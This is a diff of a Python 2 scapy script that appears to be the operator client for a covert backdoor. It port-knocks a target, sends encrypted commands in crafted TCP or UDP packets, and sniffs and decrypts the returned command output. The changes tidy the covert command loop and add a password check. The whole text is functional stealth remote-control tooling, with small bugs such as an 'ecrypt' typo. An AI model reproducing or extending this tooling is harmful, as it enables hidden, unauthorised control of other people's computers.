@@ -6,8 +6,7 @@ from scapy.all import *
 
 # flag to determine when to stop reading the results of a command and decrypt everything
 flag = False
-
-encryptedResults = ""
+Results = ""
 
 def portKnock():
     for knock in configfile.knock:
@@ -20,46 +19,43 @@ def sendCommand(protocol, data, password):
         packet = IP(dst=configfile.ip)/TCP(dport=8000, sport=7999)/Raw(load=encryption.encrypt(password+data, configfile.password))
     if protocol == "udp":
         packet = IP(dst=configfile.ip)/UDP(dport=8000, sport=7999)/Raw(load=encryption.ecrypt(password+data, configfile.password))
-    send(packet)
+    send(packet, verbose=0)
 
 def recvCommand(packet):
    global flag
-   global encryptedResults
+   global Results
    if packet.haslayer(IP):
     if packet[IP].src == configfile.ip:
         dataReceived = packetFunctions.parsePacket(packet)
-        encryptedResults += dataReceived
-        print("encr results")
-        # encrypted data should be a string of either 1 or 2 characters
-        # appent those characters to the global encrypted string
+        Results += (dataReceived)
         if packet.haslayer(Raw):
-            print ("has raw")
             if packet[Raw].load == configfile.password:
-                print ("rec password")
+                print "Got password"
                 flag = True
-                print encryptedResults
-                print len(encryptedResults)
-                decryptedData = encryption.decrypt(encryptedResults, configfile.password)
-                print decryptedData
-                # decrypt that global encrypted string here, print it, and then set it to "" again
-
-        # data = encryption.decrypt(packet['Raw'].load, configfile.password)
-        # if data.startswith(configfile.password):
-        #     data = data[len(configfile.password):]
-        #     print data
+                decryptedData = encryption.decrypt(Results, configfile.password)
+                if decryptedData.startswith(configfile.password):
+                    data = decryptedData[len(configfile.password):]
+                else:
+                    raise "Incorrect password in data."
+                print data
+                Results = ""
 
 def main():
-    global var
+    global flag
     portKnock()
 
     while 1:
         command = raw_input("Enter command: ")
         sendCommand(configfile.protocol, command, configfile.password)
         flag = False
+        
         while 1:
-            sniff(filter='{0} and dst port 8000'.format(configfile.protocol), prn=recvCommand)
+            sniff(filter='{0} and dst port 8000'.format(configfile.protocol), count=1, prn=recvCommand)
             if flag == True:
                 break
 
 if __name__ == '__main__':
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print "exiting.."
